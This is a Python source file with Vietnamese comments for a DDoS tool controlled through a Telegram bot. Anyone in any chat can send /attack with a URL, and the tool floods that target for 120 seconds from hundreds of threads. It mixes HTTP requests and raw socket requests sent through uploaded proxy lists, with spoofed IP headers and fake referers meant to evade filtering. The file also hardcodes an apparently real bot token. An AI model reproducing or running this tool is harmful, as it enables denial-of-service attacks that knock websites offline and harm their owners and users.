import requests
import threading
import random
import time
import os
import socket
import ssl
import json
import sys
import re
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse

# =====================================================
# DDOS LAYER7 - KHÔNG GIỚI HẠN NHÓM, LỆNH Ở ĐÂU CŨNG ĐƯỢC
# HỖ TRỢ /attack URL - TẤN CÔNG BẤT KỲ TARGET NÀO
# =====================================================

# -------------------- CẤU HÌNH TELEGRAM --------------------
TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"
# KHÔNG CẦN CHAT_ID - Bot trả lời mọi nơi, mọi nhóm

# -------------------- BIẾN TOÀN CỤC --------------------
stop_event = threading.Event()
is_running = False
attack_thread = None
proxy_list = []
user_agents = []
proxy_update_time = 0

# Target mặc định, có thể thay đổi qua lệnh /attack URL
current_target = {
    'url': 'http://192.168.1.100:8080',
    'host': '192.168.1.100',
    'port': 8080,
    'ssl': False
}

thread_count = 500
requests_per_second = 200
MAX_RUN_TIME = 120

attack_stats = {
    'total_requests': 0,
    'success_count': 0,
    'fail_count': 0,
    'status_codes': {},
    'bytes_sent': 0,
    'start_time': 0,
    'session_count': 0,
    'current_target': ''
}
stats_lock = threading.Lock()

# =====================================================
# LOAD USER-AGENT
# =====================================================
def load_user_agents():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0",
    ]
    if os.path.exists("user_agents.txt"):
        with open("user_agents.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    agents.append(line)
    return agents

user_agents = load_user_agents()

# =====================================================
# ĐỌC PROXY
# =====================================================
def load_proxies(filepath):
    proxies = []
    if not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                try:
                    if '://' in line:
                        proxy_str = line
                    elif '@' in line:
                        auth, addr = line.split('@')
                        user, passwd = auth.split(':')
                        ip, port = addr.split(':')
                        proxy_str = f"http://{user}:{passwd}@{ip}:{port}"
                    else:
                        ip, port = line.split(':')
                        proxy_str = f"http://{ip}:{port}"
                    proxies.append({'http': proxy_str, 'https': proxy_str})
                except:
                    continue
    return proxies

# =====================================================
# GỬI TELEGRAM - TRẢ LỜI MỌI CHAT ID
# =====================================================
def send_telegram(message, chat_id=None):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'text': message, 'parse_mode': 'HTML'}
        if chat_id:
            payload['chat_id'] = chat_id
        # Nếu không có chat_id, gửi về chat_id mặc định (lấy từ lệnh gần nhất)
        else:
            # Lấy chat_id từ biến toàn cục hoặc bỏ qua
            return
        requests.post(url, data=payload, timeout=5)
    except:
        pass

# =====================================================
# TẢI FILE PROXY TỪ TELEGRAM
# =====================================================
def download_telegram_file(file_id, save_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
        params = {'file_id': file_id}
        r = requests.get(url, params=params, timeout=10)
        if r.status_code != 200:
            return False
        data = r.json()
        if not data.get('ok'):
            return False
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        r = requests.get(download_url, timeout=30)
        if r.status_code != 200:
            return False
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return True
    except:
        return False

# =====================================================
# CẬP NHẬT PROXY
# =====================================================
def update_proxies_from_file(file_path, chat_id):
    global proxy_list, proxy_update_time
    new_proxies = load_proxies(file_path)
    if new_proxies:
        proxy_list = new_proxies
        proxy_update_time = time.time()
        send_telegram(f"🔄 Đã cập nhật proxy từ file: {file_path}\n📊 Số proxy: {len(proxy_list)}", chat_id)
        return True
    else:
        send_telegram(f"❌ File {file_path} không có proxy hợp lệ.", chat_id)
        return False

# =====================================================
# PARSE URL TỪ LỆNH
# =====================================================
def parse_target_url(url_string):
    if not url_string.startswith(('http://', 'https://')):
        url_string = 'http://' + url_string
    
    parsed = urlparse(url_string)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    ssl = parsed.scheme == 'https'
    
    # Đảm bảo URL đầy đủ
    if not parsed.path:
        url_string = url_string.rstrip('/') + '/'
    
    return {
        'url': url_string,
        'host': host,
        'port': port,
        'ssl': ssl
    }

# =====================================================
# TẠO HEADER
# =====================================================
def generate_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive, Upgrade',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://twitter.com/',
            'https://www.instagram.com/'
        ])
    }

# =====================================================
# TẤN CÔNG HTTP - SỬ DỤNG TARGET HIỆN TẠI
# =====================================================
def attack_http(proxy, target):
    session = requests.Session()
    session.proxies.update(proxy)
    session.timeout = 2
    session.verify = False
    
    methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
    method = random.choice(methods)
    headers = generate_headers()
    
    url = target['url']
    if method in ['GET', 'HEAD']:
        params = {f'p{random.randint(1,9999)}': 'x'*random.randint(10,1000) for _ in range(random.randint(3,10))}
        url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
    
    try:
        if method == 'GET':
            r = session.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            data = {f'f{i}': 'v'*random.randint(100,2000) for i in range(20)}
            r = session.post(url, data=data, headers=headers, timeout=2)
        elif method == 'HEAD':
            r = session.head(url, headers=headers, timeout=2)
        else:
            r = session.options(url, headers=headers, timeout=2)
        
        session.close()
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            code = str(r.status_code)
            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
            if 200 <= r.status_code < 400:
                attack_stats['success_count'] += 1
            else:
                attack_stats['fail_count'] += 1
            attack_stats['bytes_sent'] += len(r.request.body or b'') + len(str(r.request.headers))
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
        session.close()
        return False

# =====================================================
# TẤN CÔNG SOCKET - SỬ DỤNG TARGET HIỆN TẠI
# =====================================================
def attack_socket(proxy, target):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        if proxy:
            proxy_ip, proxy_port = proxy.replace('http://', '').split(':')
            sock.connect((proxy_ip, int(proxy_port)))
            connect_cmd = f"CONNECT {target['host']}:{target['port']} HTTP/1.1\r\nHost: {target['host']}\r\n\r\n"
            sock.send(connect_cmd.encode())
            response = sock.recv(4096)
            if b'200' not in response:
                sock.close()
                return False
        else:
            sock.connect((target['host'], target['port']))
        
        if target['ssl']:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target['host'])
        
        path = '/' + 'x'*random.randint(10,500) + f'?id={random.randint(1,999999)}&t={time.time()}'
        headers = generate_headers()
        request = f"GET {path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        for _ in range(random.randint(3,10)):
            sock.send(request.encode())
            time.sleep(0.001)
        
        sock.close()
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['success_count'] += 1
            attack_stats['bytes_sent'] += len(request) * random.randint(3,10)
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
        try:
            if sock:
                sock.close()
        except:
            pass
        return False

# =====================================================
# WORKER
# =====================================================
def attack_worker(proxy_pool, target):
    while not stop_event.is_set():
        try:
            if proxy_pool and random.random() < 0.7:
                proxy = random.choice(proxy_pool)
            else:
                proxy = None
            
            attack_type = random.choice(['http', 'socket', 'http', 'socket', 'http'])
            
            if attack_type == 'http' and proxy:
                attack_http(proxy, target)
            else:
                attack_socket(proxy, target)
            
            time.sleep(1.0 / requests_per_second)
        except:
            continue

# =====================================================
# THỐNG KÊ
# =====================================================
def get_stats_text():
    with stats_lock:
        elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        rate = total / max(elapsed, 1)
        bytes_sent = attack_stats['bytes_sent'] / (1024 * 1024)
        codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
        
        remaining = max(0, MAX_RUN_TIME - elapsed)
        status = "🟢 ĐANG TẤN CÔNG" if is_running else "🔴 ĐANG CHỜ LỆNH"
        
        target_display = attack_stats.get('current_target', 'Chưa có')
        
        return f"""
<b>🔥 DDOS BOT - KHÔNG GIỚI HẠN</b>
📌 Trạng thái: {status}
🎯 Mục tiêu: {target_display}
⏱ Đã chạy: {elapsed}s / {MAX_RUN_TIME}s
⏳ Còn lại: {remaining}s
📨 Tổng request: {total:,}
✅ Thành công: {success:,}
❌ Thất bại: {fail:,}
📈 Tốc độ: {rate:.1f} req/s
📊 Mã trạng thái: {codes or 'N/A'}
💾 Dữ liệu gửi: {bytes_sent:.2f} MB
🌐 Proxy: {len(proxy_list)}
🧵 Luồng: {thread_count}
        """

# =====================================================
# THỰC HIỆN TẤN CÔNG
# =====================================================
def run_attack(target, chat_id):
    global is_running, current_target
    
    # Cập nhật target
    current_target = target
    with stats_lock:
        attack_stats['current_target'] = target['url']
        attack_stats.update({
            'total_requests': 0,
            'success_count': 0,
            'fail_count': 0,
            'status_codes': {},
            'bytes_sent': 0,
            'start_time': time.time(),
            'session_count': attack_stats.get('session_count', 0) + 1
        })
    
    stop_event.clear()
    is_running = True
    
    send_telegram(f"▶️ BẮT ĐẦU TẤN CÔNG!\n🎯 Target: {target['url']}\n🌐 Proxy: {len(proxy_list)}\n⏱ Tự động dừng sau {MAX_RUN_TIME}s", chat_id)
    
    proxy_pool = proxy_list if proxy_list else []
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(attack_worker, proxy_pool, target) for _ in range(thread_count)]
        
        start = time.time()
        last_report = 0
        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed - last_report >= 20:
                last_report = elapsed
                with stats_lock:
                    total = attack_stats['total_requests']
                    rate = total / max(elapsed, 1)
                send_telegram(f"⏳ {elapsed}s/{MAX_RUN_TIME}s | Tốc độ: {rate:.1f} req/s | Tổng: {total:,}", chat_id)
    
    stop_event.set()
    is_running = False
    
    with stats_lock:
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        elapsed = int(time.time() - attack_stats['start_time'])
        rate = total / max(elapsed, 1)
    
    send_telegram(f"""
⏹️ ĐÃ DỪNG SAU {min(elapsed, MAX_RUN_TIME)}s
📊 TỔNG KẾT:
- Target: {target['url']}
- Tổng request: {total:,}
- Thành công: {success:,}
- Thất bại: {fail:,}
- Tốc độ TB: {rate:.1f} req/s
    """, chat_id)
    send_telegram(get_stats_text(), chat_id)

# =====================================================
# TELEGRAM LISTENER - KHÔNG GIỚI HẠN NHÓM
# =====================================================
def telegram_listener():
    global attack_thread, is_running, proxy_list, proxy_file
    last_update_id = 0
    
    print("[+] Bot đã sẵn sàng - KHÔNG GIỚI HẠN NHÓM")
    print("[+] Mọi lệnh /attack URL đều được chấp nhận")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 15}
            r = requests.get(url, params=params, timeout=20)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        msg = update.get('message', {})
                        chat_id = msg.get('chat', {}).get('id')
                        
                        if not chat_id:
                            continue
                        
                        # ===== XỬ LÝ FILE PROXY =====
                        document = msg.get('document')
                        if document:
                            file_name = document.get('file_name', '')
                            if file_name.endswith('.txt'):
                                file_id = document['file_id']
                                send_telegram(f"📥 Đang tải file proxy: {file_name}", chat_id)
                                
                                save_path = f"proxy_{int(time.time())}.txt"
                                if download_telegram_file(file_id, save_path):
                                    if update_proxies_from_file(save_path, chat_id):
                                        import shutil
                                        shutil.copy(save_path, proxy_file)
                                    threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
                                else:
                                    send_telegram("❌ Không thể tải file proxy.", chat_id)
                        
                        # ===== XỬ LÝ LỆNH =====
                        text = msg.get('text', '').strip()
                        if not text:
                            continue
                        
                        # Lệnh /attack URL - QUAN TRỌNG
                        if text.lower().startswith('/attack'):
                            parts = text.split(maxsplit=1)
                            if len(parts) >= 2:
                                url_input = parts[1].strip()
                                # Kiểm tra URL hợp lệ
                                if url_input.startswith(('http://', 'https://')) or '.' in url_input:
                                    target = parse_target_url(url_input)
                                    if is_running:
                                        send_telegram("⚠️ Đang có đợt tấn công chạy. Dùng /stop trước.", chat_id)
                                    else:
                                        if not proxy_list:
                                            send_telegram("⚠️ Không có proxy! Hãy gửi file proxy .txt trước.", chat_id)
                                        else:
                                            send_telegram(f"🎯 Đã nhận target: {target['url']}", chat_id)
                                            attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                            attack_thread.start()
                                else:
                                    send_telegram("❌ URL không hợp lệ. VD: /attack https://example.com", chat_id)
                            else:
                                # Không có URL, dùng target mặc định
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công chạy.", chat_id)
                                else:
                                    if not proxy_list:
                                        send_telegram("⚠️ Không có proxy! Hãy gửi file proxy .txt trước.", chat_id)
                                    else:
                                        target = current_target
                                        send_telegram(f"🎯 Dùng target mặc định: {target['url']}", chat_id)
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                        
                        elif text.lower() == '/stop':
                            if is_running:
                                stop_event.set()
                                is_running = False
                                send_telegram("⛔ Đã dừng tấn công ngay lập tức!", chat_id)
                            else:
                                send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)
                        
                        elif text.lower() == '/status':
                            send_telegram(get_stats_text(), chat_id)
                        
                        elif text.lower() == '/proxy':
                            send_telegram(f"🌐 Số proxy hiện có: {len(proxy_list)}\n📄 File nguồn: {proxy_file}", chat_id)
                        
                        elif text.lower() == '/help':
                            help_text = """
<b>🤖 DDOS BOT - KHÔNG GIỚI HẠN</b>

📌 <b>LỆNH Ở MỌI NHÓM, MỌI CHAT</b>

📤 <b>GỬI FILE PROXY:</b>
Gửi file .txt chứa proxy (mỗi dòng 1 proxy)
Bot tự động nhận và cập nhật.

📋 <b>LỆNH:</b>
<code>/attack URL</code> - Tấn công target (VD: /attack https://example.com)
<code>/attack</code> - Tấn công target mặc định
<code>/stop</code> - Dừng ngay lập tức
<code>/status</code> - Xem trạng thái
<code>/proxy</code> - Xem số proxy
<code>/threads &lt;số&gt;</code> - Đổi số luồng
<code>/speed &lt;số&gt;</code> - Đổi tốc độ
<code>/help</code> - Trợ giúp

⏱ Mỗi đợt chạy tối đa 120s
                            """
                            send_telegram(help_text, chat_id)
                        
                        elif text.lower().startswith('/threads'):
                            try:
                                global thread_count
                                new_count = int(text.split()[1])
                                if new_count > 0:
                                    thread_count = new_count
                                    send_telegram(f"✅ Đã cập nhật số luồng: {thread_count}", chat_id)
                                else:
                                    send_telegram("❌ Số luồng phải > 0", chat_id)
                            except:
                                send_telegram("❌ Dùng: /threads <số>", chat_id)
                        
                        elif text.lower().startswith('/speed'):
                            try:
                                global requests_per_second
                                new_speed = int(text.split()[1])
                                if new_speed > 0:
                                    requests_per_second = new_speed
                                    send_telegram(f"✅ Đã cập nhật tốc độ: {requests_per_second} req/s", chat_id)
                                else:
                                    send_telegram("❌ Tốc độ phải > 0", chat_id)
                            except:
                                send_telegram("❌ Dùng: /speed <số>", chat_id)
            
            time.sleep(2)
        except Exception as e:
            time.sleep(5)

# =====================================================
# KHỞI CHẠY CHÍNH
# =====================================================
if __name__ == "__main__":
    proxy_file = "proxies.txt"
    if os.path.exists(proxy_file):
        proxy_list = load_proxies(proxy_file)
        proxy_update_time = time.time()
        print(f"[+] Đã tải {len(proxy_list)} proxy từ file")
    else:
        print("[+] Chưa có file proxy. Gửi file .txt qua Telegram để tạo.")
    
    print(f"[+] Bot sẵn sàng - Lệnh /attack URL ở MỌI NHÓM")
    print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    
    threading.Thread(target=telegram_listener, daemon=True).start()
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        stop_event.set()
        is_running = False
        print("[+] Bot đã dừng.")
